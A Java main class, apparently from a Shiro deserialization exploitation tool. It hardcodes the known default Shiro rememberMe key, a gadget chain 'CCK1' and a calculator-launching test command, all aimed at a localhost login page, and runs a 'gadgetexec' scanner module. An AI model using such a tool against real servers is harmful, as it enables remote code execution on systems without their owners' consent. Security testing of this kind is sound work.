package core;

import core.scan.*;
import core.scan.eneity.ShiroTarget;
import core.scan.factory.ScannerFactory;

public class DearShiro {

    public static void main(String[] args) throws Exception {
//        String module = args[0];

        // test data
        String module = "gadgetexec";
        String base = "http://127.0.0.1:8000/login.jsp";
        String key = "kPH+bIxk5D2deZiIxcaaaA==";
        String command = "open -a Calculator";
        String gadget = "CCK1";

        ShiroTarget target = new ShiroTarget(base, key, gadget, command);
        ScannerFactory factory = new ScannerFactory(target);
        ShiroScanner scanner = factory.getScanner(module);
        scanner.scan();
    }
}
